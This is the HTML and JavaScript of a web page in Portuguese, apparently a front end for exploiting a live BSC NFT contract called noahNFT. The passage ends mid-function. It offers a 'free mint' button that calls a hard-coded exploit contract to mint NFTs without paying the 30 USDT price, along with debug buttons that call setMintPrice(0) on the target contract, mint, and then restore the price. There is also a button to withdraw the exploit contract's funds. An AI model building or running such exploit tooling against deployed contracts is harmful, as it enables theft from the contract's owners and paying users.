<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>noahNFT - Plataforma de Interação Avançada</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            color: #fff;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
            max-width: 1000px;
            padding: 30px;
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            margin-top: 50px;
            margin-bottom: 50px;
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .card-header {
            background: rgba(255, 255, 255, 0.2);
            font-weight: bold;
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }
        .btn-primary {
            background: linear-gradient(45deg, #3a7bd5, #00d2ff);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.4);
        }
        .btn-success {
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-warning {
            background: linear-gradient(45deg, #f093fb, #f5576c);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-danger {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            border: none;
            border-radius: 30px;
            padding: 10px 25px;
            font-weight: bold;
        }
        .wallet-info {
            background: rgba(255, 255, 255, 0.15);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .balance-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .balance-value {
            font-size: 24px;
            font-weight: bold;
            color: #4fc3f7;
        }
        .nft-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }
        .nft-image {
            width: 80px;
            height: 80px;
            border-radius: 10px;
            margin-right: 15px;
            background: #333;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #fdbb2d;
        }
        .nft-info {
            flex-grow: 1;
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-connected {
            background-color: #4caf50;
        }
        .status-disconnected {
            background-color: #f44336;
        }
        .exploit-section {
            background: rgba(255, 0, 0, 0.15);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            border: 1px dashed #ff0000;
        }
        .contract-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .loading.show {
            display: block;
        }
        .spinner-border {
            width: 3rem;
            height: 3rem;
        }
        .transaction-info {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            display: none;
        }
        .transaction-info.show {
            display: block;
        }
        .alert-custom {
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.7);
        }
        .tab-content {
            padding: 20px 0;
        }
        .nav-tabs .nav-link {
            color: rgba(255, 255, 255, 0.7);
            border: none;
            border-radius: 10px 10px 0 0;
            margin-right: 5px;
        }
        .nav-tabs .nav-link.active {
            color: #fff;
            background: rgba(255, 255, 255, 0.2);
            border: none;
        }
        .contract-deploy {
            background: rgba(0, 255, 0, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
            border: 1px dashed #00ff00;
        }
        .code-block {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
        }
        .success-box {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid #4caf50;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .error-details {
            background: rgba(244, 67, 54, 0.2);
            border: 1px solid #f44336;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
        .gas-options {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid #ffc107;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }
        .debug-info {
            background: rgba(33, 150, 243, 0.2);
            border: 1px solid #2196f3;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text-center mb-4">
            <h1 class="display-4"><i class="fas fa-coins"></i> noahNFT - Plataforma Avançada</h1>
            <p class="lead">Interação com Contrato NFT e Contrato de Exploração</p>
        </div>

        <div id="alertContainer"></div>

        <!-- Carteira -->
        <div class="wallet-info">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <span class="status-indicator" id="connectionStatus"></span>
                    <span id="connectionText">Não conectado</span>
                </div>
                <button id="connectWalletBtn" class="btn btn-primary">
                    <i class="fas fa-wallet"></i> Conectar Carteira
                </button>
            </div>
            <div class="mt-3" id="walletAddress" style="display: none;">
                <strong>Endereço:</strong> <span id="addressText"></span>
                <button class="btn btn-sm btn-outline-light ms-2" id="copyAddressBtn">
                    <i class="fas fa-copy"></i>
                </button>
            </div>
        </div>

        <!-- Informações dos Contratos -->
        <div class="contract-info">
            <h5><i class="fas fa-info-circle"></i> Informações dos Contratos</h5>
            <div class="row">
                <div class="col-md-6">
                    <strong>Contrato Original:</strong><br>
                    <span id="originalContract">0x660689af09aB2628afBd781e541bB1DD3d316DD9</span>
                </div>
                <div class="col-md-6">
                    <strong>Contrato de Exploração:</strong><br>
                    <span id="exploitContract">0xddF65c0A504fE89aBAA540DcD42512e8232fe134</span>
                </div>
            </div>
        </div>

        <!-- Abas -->
        <ul class="nav nav-tabs" id="contractTabs" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="original-tab" data-bs-toggle="tab" data-bs-target="#original" type="button" role="tab" aria-controls="original" aria-selected="true">
                    <i class="fas fa-coins"></i> Contrato Original
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="exploit-tab" data-bs-toggle="tab" data-bs-target="#exploit" type="button" role="tab" aria-controls="exploit" aria-selected="false">
                    <i class="fas fa-bug"></i> Contrato de Exploração
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link" id="debug-tab" data-bs-toggle="tab" data-bs-target="#debug" type="button" role="tab" aria-controls="debug" aria-selected="false">
                    <i class="fas fa-bug"></i> Debug
                </button>
            </li>
        </ul>
        <div class="tab-content" id="contractTabsContent">
            <!-- Conteúdo do Contrato Original -->
            <div class="tab-pane fade show active" id="original" role="tabpanel" aria-labelledby="original-tab">
                <!-- Saldos -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="balance-card">
                            <div class="balance-value" id="usdtBalance">0 USDT</div>
                            <div>Saldo de USDT</div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="balance-card">
                            <div class="balance-value" id="nftCount">0 NFTs</div>
                            <div>Seus NFTs</div>
                        </div>
                    </div>
                </div>

                <!-- Mint de NFT -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-plus-circle"></i> Mint de NFT
                    </div>
                    <div class="card-body">
                        <p>Para mintar um NFT, você precisa de 30 USDT. Após o mint, você receberá recompensas em USDT periodicamente.</p>
                        <div class="d-grid gap-2">
                            <button id="mintNftBtn" class="btn btn-success" disabled>
                                <i class="fas fa-magic"></i> Mint NFT (30 USDT)
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Resgate de Recompensas -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-coins"></i> Resgate de Recompensas
                    </div>
                    <div class="card-body">
                        <p>Resgate suas recompensas acumuladas em USDT. Uma taxa de 5% será deduzida como taxa de serviço.</p>
                        <div class="d-grid gap-2">
                            <button id="claimRewardsBtn" class="btn btn-primary" disabled>
                                <i class="fas fa-hand-holding-usd"></i> Resgatar Recompensas
                            </button>
                        </div>
                        <div class="mt-3">
                            <strong>Recompensas disponíveis:</strong> <span id="availableRewards">0 USDT</span>
                        </div>
                    </div>
                </div>

                <!-- Seus NFTs -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-images"></i> Seus NFTs
                    </div>
                    <div class="card-body">
                        <div id="nftList">
                            <p class="text-center">Você não possui NFTs ainda</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Contrato de Exploração -->
            <div class="tab-pane fade" id="exploit" role="tabpanel" aria-labelledby="exploit-tab">
                <!-- Configurar Contrato de Exploração -->
                <div class="contract-deploy">
                    <h5><i class="fas fa-cog"></i> Configurar Contrato de Exploração</h5>
                    <p>O endereço do contrato de exploração já está preenchido. Apenas clique em "Configurar" para começar.</p>
                    <div class="input-group mb-3">
                        <span class="input-group-text">Endereço do Contrato:</span>
                        <input type="text" class="form-control" id="exploitContractInput" placeholder="0x..." value="0xddF65c0A504fE89aBAA540DcD42512e8232fe134">
                        <button class="btn btn-primary" id="setExploitContractBtn">Configurar</button>
                    </div>
                    <div id="exploitStatus" class="success-box" style="display: none;">
                        <i class="fas fa-check-circle"></i> Contrato de exploração configurado com sucesso!
                    </div>
                </div>

                <!-- Opções de Gás -->
                <div class="gas-options">
                    <h5><i class="fas fa-gas-pump"></i> Opções de Gás</h5>
                    <p>Se estiver enfrentando problemas com a estimativa de gás, tente aumentar o limite de gás manualmente.</p>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="input-group mb-3">
                                <span class="input-group-text">Limite de Gás:</span>
                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="1000000">
                                <span class="input-group-text">unidades</span>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="input-group mb-3">
                                <span class="input-group-text">Preço do Gás:</span>
                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="15">
                                <span class="input-group-text">Gwei</span>
                            </div>
                        </div>
                    </div>
                    <div class="form-check form-switch">
                        <input class="form-check-input" type="checkbox" id="skipGasEstimation">
                        <label class="form-check-label" for="skipGasEstimation">
                            Pular estimativa de gás (avançado)
                        </label>
                    </div>
                </div>

                <!-- Mint Gratuito -->
                <div class="exploit-section">
                    <h5><i class="fas fa-bug"></i> Mint Gratuito (Exploração)</h5>
                    <p>Use este método para mintar um NFT sem pagar 30 USDT. Este método utiliza uma vulnerabilidade no contrato original através do contrato de exploração.</p>
                    <div class="d-grid gap-2">
                        <button id="freeMintBtn" class="btn btn-danger" disabled>
                            <i class="fas fa-magic"></i> Mint Gratuito
                        </button>
                    </div>
                </div>

                <!-- Informações do Contrato de Exploração -->
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-info-circle"></i> Informações do Contrato de Exploração
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <strong>Endereço:</strong> <span id="exploitContractAddress">Não configurado</span>
                        </div>
                        <div class="mb-3">
                            <strong>Dono:</strong> <span id="exploitContractOwner">N/A</span>
                        </div>
                        <div class="mb-3">
                            <strong>Saldo do Contrato:</strong> <span id="exploitContractBalance">0 BNB</span>
                        </div>
                        <div class="d-grid gap-2">
                            <button id="withdrawBtn" class="btn btn-warning" disabled>
                                <i class="fas fa-hand-holding-usd"></i> Sacar Fundos
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Conteúdo do Debug -->
            <div class="tab-pane fade" id="debug" role="tabpanel" aria-labelledby="debug-tab">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-bug"></i> Informações de Debug
                    </div>
                    <div class="card-body">
                        <h5>Testar Funções Individualmente</h5>
                        <p>Use estas opções para testar cada função do contrato de exploração separadamente e identificar onde está o problema.</p>
                        
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <button id="testSetPriceBtn" class="btn btn-warning w-100" disabled>
                                    <i class="fas fa-tag"></i> Testar setMintPrice(0)
                                </button>
                            </div>
                            <div class="col-md-6">
                                <button id="testMintBtn" class="btn btn-info w-100" disabled>
                                    <i class="fas fa-magic"></i> Testar mint()
                                </button>
                            </div>
                        </div>
                        
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <button id="testRestorePriceBtn" class="btn btn-secondary w-100" disabled>
                                    <i class="fas fa-undo"></i> Testar setMintPrice(30e18)
                                </button>
                            </div>
                            <div class="col-md-6">
                                <button id="checkContractStateBtn" class="btn btn-primary w-100" disabled>
                                    <i class="fas fa-search"></i> Verificar Estado do Contrato
                                </button>
                            </div>
                        </div>
                        
                        <div id="debugInfo" class="debug-info" style="display: none;">
                            <h6>Informações de Debug:</h6>
                            <pre id="debugContent"></pre>
                        </div>
                        
                        <div class="mt-4">
                            <h5>Eventos do Contrato</h5>
                            <p>Monitore os eventos emitidos pelo contrato de exploração para entender o que está acontecendo.</p>
                            <button id="listenEventsBtn" class="btn btn-success" disabled>
                                <i class="fas fa-headphones"></i> Iniciar Monitoramento de Eventos
                            </button>
                            <div id="eventsList" class="debug-info mt-3" style="display: none;">
                                <h6>Eventos Recentes:</h6>
                                <div id="eventsContent"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Carregamento -->
        <div class="loading" id="loadingIndicator">
            <div class="spinner-border text-light" role="status">
                <span class="visually-hidden">Carregando...</span>
            </div>
            <p class="mt-2">Processando transação...</p>
        </div>

        <!-- Informações da Transação -->
        <div class="transaction-info" id="transactionInfo">
            <h5>Informações da Transação</h5>
            <div class="mb-2">
                <strong>Hash:</strong> <span id="txHash"></span>
                <button class="btn btn-sm btn-outline-light ms-2" id="copyTxHashBtn">
                    <i class="fas fa-copy"></i>
                </button>
            </div>
            <div>
                <strong>Status:</strong> <span id="txStatus"></span>
            </div>
        </div>

        <div class="footer">
            <p>Contrato Original: 0x660689af09aB2628afBd781e541bB1DD3d316DD9</p>
            <p>Contrato de Exploração: 0xddF65c0A504fE89aBAA540DcD42512e8232fe134</p>
            <p>Rede: BSC (BEP-20)</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // Configurações
        const ORIGINAL_CONTRACT_ADDRESS = "0x660689af09aB2628afBd781e541bB1DD3d316DD9";
        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT na BSC
        const EXPLOIT_CONTRACT_ADDRESS = "0xddF65c0A504fE89aBAA540DcD42512e8232fe134"; // Endereço do contrato de exploração
        
        // ABI do contrato noahNFT
        const ORIGINAL_CONTRACT_ABI = [
            "function mint() public",
            "function claim() public",
            "function balanceOf(address owner) view returns (uint256)",
            "function ownerOf(uint256 tokenId) view returns (address)",
            "function getReward(address user) view returns (uint256)",
            "function lastClaimed(uint256 tokenId) view returns (uint256)",
            "function setMintPrice(uint256 newPrice) public",
            "function owner() view returns (address)",
            "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
            "function totalSupply() view returns (uint256)",
            "function tokenURI(uint256 tokenId) view returns (string memory)",
            "event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)"
        ];
        
        // ABI do contrato de exploração
        const EXPLOIT_CONTRACT_ABI = [
            "function freeMint() external",
            "function withdraw() external",
            "function noahNFT() view returns (address)",
            "function owner() view returns (address)",
            "event FreeMint(address indexed user, uint256 tokenId)",
            "event SetPriceAttempt(uint256 newPrice, bool success)",
            "event MintAttempt(bool success)"
        ];
        
        // ABI do token USDT (BEP-20)
        const USDT_ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
        ];
        
        // Variáveis globais
        let provider;
        let signer;
        let originalContract;
        let exploitContract;
        let usdtContract;
        let userAddress;
        let exploitContractAddress;
        let eventListeners = [];
        
        // Elementos DOM
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        const connectionStatus = document.getElementById('connectionStatus');
        const connectionText = document.getElementById('connectionText');
        const walletAddress = document.getElementById('walletAddress');
        const addressText = document.getElementById('addressText');
        const copyAddressBtn = document.getElementById('copyAddressBtn');
        const usdtBalance = document.getElementById('usdtBalance');
        const nftCount = document.getElementById('nftCount');
        const mintNftBtn = document.getElementById('mintNftBtn');
        const freeMintBtn = document.getElementById('freeMintBtn');
        const claimRewardsBtn = document.getElementById('claimRewardsBtn');
        const withdrawBtn = document.getElementById('withdrawBtn');
        const availableRewards = document.getElementById('availableRewards');
        const nftList = document.getElementById('nftList');
        const exploitContractAddressSpan = document.getElementById('exploitContractAddress');
        const exploitContractOwner = document.getElementById('exploitContractOwner');
        const exploitContractBalance = document.getElementById('exploitContractBalance');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const transactionInfo = document.getElementById('transactionInfo');
        const txHash = document.getElementById('txHash');
        const txStatus = document.getElementById('txStatus');
        const copyTxHashBtn = document.getElementById('copyTxHashBtn');
        const alertContainer = document.getElementById('alertContainer');
        const exploitContractInput = document.getElementById('exploitContractInput');
        const setExploitContractBtn = document.getElementById('setExploitContractBtn');
        const exploitStatus = document.getElementById('exploitStatus');
        const gasLimitInput = document.getElementById('gasLimitInput');
        const gasPriceInput = document.getElementById('gasPriceInput');
        const skipGasEstimation = document.getElementById('skipGasEstimation');
        const testSetPriceBtn = document.getElementById('testSetPriceBtn');
        const testMintBtn = document.getElementById('testMintBtn');
        const testRestorePriceBtn = document.getElementById('testRestorePriceBtn');
        const checkContractStateBtn = document.getElementById('checkContractStateBtn');
        const debugInfo = document.getElementById('debugInfo');
        const debugContent = document.getElementById('debugContent');
        const listenEventsBtn = document.getElementById('listenEventsBtn');
        const eventsList = document.getElementById('eventsList');
        const eventsContent = document.getElementById('eventsContent');
        
        // Event Listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        copyAddressBtn.addEventListener('click', () => copyToClipboard(addressText.textContent));
        mintNftBtn.addEventListener('click', mintNft);
        freeMintBtn.addEventListener('click', freeMint);
        claimRewardsBtn.addEventListener('click', claimRewards);
        withdrawBtn.addEventListener('click', withdrawFunds);
        copyTxHashBtn.addEventListener('click', () => copyToClipboard(txHash.textContent));
        setExploitContractBtn.addEventListener('click', setExploitContract);
        testSetPriceBtn.addEventListener('click', testSetPrice);
        testMintBtn.addEventListener('click', testMint);
        testRestorePriceBtn.addEventListener('click', testRestorePrice);
        checkContractStateBtn.addEventListener('click', checkContractState);
        listenEventsBtn.addEventListener('click', toggleEventListening);
        
        // Funções
        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Conectar à carteira
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];
                    
                    // Configurar provider e signer
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    
                    // Configurar contratos
                    originalContract = new ethers.Contract(ORIGINAL_CONTRACT_ADDRESS, ORIGINAL_CONTRACT_ABI, signer);
                    usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
                    
                    // Atualizar UI
                    updateWalletUI();
                    await updateBalances();
                    await updateNFTs();
                    await updateRewards();
                    
                    // Habilitar botões
                    mintNftBtn.disabled = false;
                    claimRewardsBtn.disabled = false;
                    
                    showAlert('Carteira conectada com sucesso!', 'success');
                } catch (error) {
                    console.error('Erro ao conectar carteira:', error);
                    showAlert('Erro ao conectar carteira. Tente novamente.', 'danger');
                }
            } else {
                showAlert('MetaMask ou outra carteira compatível não encontrada. Instale a MetaMask e tente novamente.', 'danger');
            }
        }
        
        function updateWalletUI() {
            connectionStatus.className = 'status-indicator status-connected';
            connectionText.textContent = 'Conectado';
            connectWalletBtn.textContent = 'Desconectar';
            connectWalletBtn.onclick = disconnectWallet;
            walletAddress.style.display = 'block';
            addressText.textContent = userAddress;
        }
        
        function disconnectWallet() {
            location.reload();
        }
        
        async function updateBalances() {
            try {
                // Saldo de USDT
                const usdtBalanceWei = await usdtContract.balanceOf(userAddress);
                const usdtBalanceEth = ethers.utils.formatUnits(usdtBalanceWei, 18);
                usdtBalance.textContent = `${parseFloat(usdtBalanceEth).toFixed(2)} USDT`;
                
                // Contagem de NFTs
                const balance = await originalContract.balanceOf(userAddress);
                nftCount.textContent = `${balance.toString()} NFTs`;
                
                // Atualizar informações do contrato de exploração se existir
                if (exploitContract) {
                    const owner = await exploitContract.owner();
                    exploitContractOwner.textContent = owner;
                    
                    const balanceWei = await provider.getBalance(exploitContractAddress);
                    const balanceEth = ethers.utils.formatEther(balanceWei);
                    exploitContractBalance.textContent = `${parseFloat(balanceEth).toFixed(6)} BNB`;
                }
            } catch (error) {
                console.error('Erro ao atualizar saldos:', error);
            }
        }
        
        async function updateNFTs() {
            try {
                const balance = await originalContract.balanceOf(userAddress);
                
                if (balance.toNumber() === 0) {
                    nftList.innerHTML = '<p class="text-center">Você não possui NFTs ainda</p>';
                    return;
                }
                
                let nftHtml = '';
                
                for (let i = 0; i < balance.toNumber(); i++) {
                    const tokenId = await originalContract.tokenOfOwnerByIndex(userAddress, i);
                    const tokenURI = await originalContract.tokenURI(tokenId);
                    
                    // Simular imagem do NFT
                    nftHtml += `
                        <div class="nft-card">
                            <div class="nft-image">
                                <i class="fas fa-gem"></i>
                            </div>
                            <div class="nft-info">
                                <h5>NFT #${tokenId.toString()}</h5>
                                <p>Token ID: ${tokenId.toString()}</p>
                                <small>URI: ${tokenURI}</small>
                            </div>
                        </div>
                    `;
                }
                
                nftList.innerHTML = nftHtml;
            } catch (error) {
                console.error('Erro ao atualizar NFTs:', error);
            }
        }
        
        async function updateRewards() {
            try {
                const rewardsWei = await originalContract.getReward(userAddress);
                const rewardsEth = ethers.utils.formatUnits(rewardsWei, 18);
                availableRewards.textContent = `${parseFloat(rewardsEth).toFixed(6)} USDT`;
            } catch (error) {
                console.error('Erro ao atualizar recompensas:', error);
            }
        }
        
        async function mintNft() {
            if (!confirm('Tem certeza que deseja mintar um NFT por 30 USDT?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Verificar saldo de USDT
                const usdtBalanceWei = await usdtContract.balanceOf(userAddress);
                const usdtBalanceEth = ethers.utils.formatUnits(usdtBalanceWei, 18);
                
                if (parseFloat(usdtBalanceEth) < 30) {
                    showAlert('Saldo de USDT insuficiente. Você precisa de pelo menos 30 USDT.', 'danger');
                    showLoading(false);
                    return;
                }
                
                // Verificar aprovação
                const allowanceWei = await usdtContract.allowance(userAddress, ORIGINAL_CONTRACT_ADDRESS);
                const allowanceEth = ethers.utils.formatUnits(allowanceWei, 18);
                
                if (parseFloat(allowanceEth) < 30) {
                    showAlert('Aprovando o contrato para usar 30 USDT...', 'info');
                    
                    const approveTx = await usdtContract.approve(ORIGINAL_CONTRACT_ADDRESS, ethers.utils.parseUnits('30', 18));
                    await approveTx.wait();
                    
                    showAlert('Aprovação concluída. Agora mintando o NFT...', 'success');
                }
                
                // Mint NFT
                const mintTx = await originalContract.mint();
                showTransactionInfo(mintTx.hash);
                
                await mintTx.wait();
                
                showAlert('NFT mintado com sucesso!', 'success');
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao mintar NFT:', error);
                showAlert(`Erro ao mintar NFT: ${error.message}`, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function setExploitContract() {
            const address = exploitContractInput.value.trim();
            
            if (!address) {
                showAlert('Por favor, insira um endereço de contrato válido.', 'danger');
                return;
            }
            
            if (!ethers.utils.isAddress(address)) {
                showAlert('Endereço de contrato inválido.', 'danger');
                return;
            }
            
            try {
                exploitContractAddress = address;
                exploitContract = new ethers.Contract(exploitContractAddress, EXPLOIT_CONTRACT_ABI, signer);
                
                // Verificar se o contrato é válido
                const noahNFTAddress = await exploitContract.noahNFT();
                
                if (noahNFTAddress.toLowerCase() !== ORIGINAL_CONTRACT_ADDRESS.toLowerCase()) {
                    showAlert('O contrato de exploração não está configurado para o contrato noahNFT correto.', 'danger');
                    return;
                }
                
                // Atualizar UI
                document.getElementById('exploitContract').textContent = exploitContractAddress;
                exploitContractAddressSpan.textContent = exploitContractAddress;
                freeMintBtn.disabled = false;
                withdrawBtn.disabled = false;
                testSetPriceBtn.disabled = false;
                testMintBtn.disabled = false;
                testRestorePriceBtn.disabled = false;
                checkContractStateBtn.disabled = false;
                listenEventsBtn.disabled = false;
                exploitStatus.style.display = 'block';
                
                showAlert('Contrato de exploração configurado com sucesso!', 'success');
                await updateBalances();
            } catch (error) {
                console.error('Erro ao configurar contrato de exploração:', error);
                showAlert(`Erro ao configurar contrato de exploração: ${error.message}`, 'danger');
            }
        }
        
        async function freeMint() {
            if (!confirm('Tem certeza que deseja usar o método de mint gratuito? Este método explora uma vulnerabilidade no contrato original.')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Obter opções de gás
                const gasLimit = parseInt(gasLimitInput.value) || 1000000;
                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '15', 'gwei');
                
                // Configurar opções de transação
                const options = {
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                };
                
                // Se pular estimativa de gás, adicionar a opção
                if (skipGasEstimation.checked) {
                    options.gasLimit = ethers.BigNumber.from(gasLimit);
                }
                
                // Mint gratuito através do contrato de exploração
                const freeMintTx = await exploitContract.freeMint(options);
                showTransactionInfo(freeMintTx.hash);
                
                await freeMintTx.wait();
                
                showAlert('NFT mintado gratuitamente com sucesso!', 'success');
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao mintar NFT gratuitamente:', error);
                
                // Exibir detalhes do erro
                let errorMessage = `Erro ao mintar NFT gratuitamente: ${error.message}`;
                
                if (error.error && error.error.data) {
                    errorMessage += `<div class="error-details mt-2">
                        <strong>Detalhes do erro:</strong><br>
                        ${JSON.stringify(error.error.data, null, 2)}
                    </div>`;
                }
                
                if (error.transaction) {
                    errorMessage += `<div class="error-details mt-2">
                        <strong>Detalhes da transação:</strong><br>
                        ${JSON.stringify(error.transaction, null, 2)}
                    </div>`;
                }
                
                showAlert(errorMessage, 'danger');
            } finally {
                showLoading(false);
            }
        }
        
        async function testSetPrice() {
            if (!confirm('Tem certeza que deseja testar a função setMintPrice(0)?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Testar setMintPrice(0)
                const tx = await originalContract.setMintPrice(0, {
                    gasLimit: 200000,
                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                showAlert('setMintPrice(0) executado com sucesso!', 'success');
                
                // Adicionar informação de debug
                addDebugInfo('setMintPrice(0) executado com sucesso');
            } catch (error) {
                console.error('Erro ao testar setMintPrice(0):', error);
                showAlert(`Erro ao testar setMintPrice(0): ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao testar setMintPrice(0): ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        async function testMint() {
            if (!confirm('Tem certeza que deseja testar a função mint()?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Testar mint()
                const tx = await originalContract.mint({
                    gasLimit: 300000,
                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                showAlert('mint() executado com sucesso!', 'success');
                
                // Adicionar informação de debug
                addDebugInfo('mint() executado com sucesso');
                
                // Atualizar saldos
                await updateBalances();
                await updateNFTs();
            } catch (error) {
                console.error('Erro ao testar mint():', error);
                showAlert(`Erro ao testar mint(): ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao testar mint(): ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        async function testRestorePrice() {
            if (!confirm('Tem certeza que deseja testar a função setMintPrice(30e18)?')) {
                return;
            }
            
            showLoading(true);
            
            try {
                // Testar setMintPrice(30e18)
                const tx = await originalContract.setMintPrice(ethers.utils.parseUnits('30', 18), {
                    gasLimit: 200000,
                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
                });
                
                showTransactionInfo(tx.hash);
                await tx.wait();
                
                showAlert('setMintPrice(30e18) executado com sucesso!', 'success');
                
                // Adicionar informação de debug
                addDebugInfo('setMintPrice(30e18) executado com sucesso');
            } catch (error) {
                console.error('Erro ao testar setMintPrice(30e18):', error);
                showAlert(`Erro ao testar setMintPrice(30e18): ${error.message}`, 'danger');
                
                // Adicionar informação de debug
                addDebugInfo(`Erro ao testar setMintPrice(30e18): ${error.message}`);
            } finally {
                showLoading(false);
            }
        }
        
        async function checkContractState() {
            showLoading(true);
            
            try {
                // Verificar estado do contrato
                const owner = await originalContract.owner();
                const totalSupply = await originalContract.totalSupply();
                const userBalance = await originalContract.balanceOf(userAddress);
                
                const stateInfo = {
                    owner: owner,
                    totalSupply: totalSupply.toString(),
                    userBalance: userBalance.toString(),
                    userAddress: userAddress,
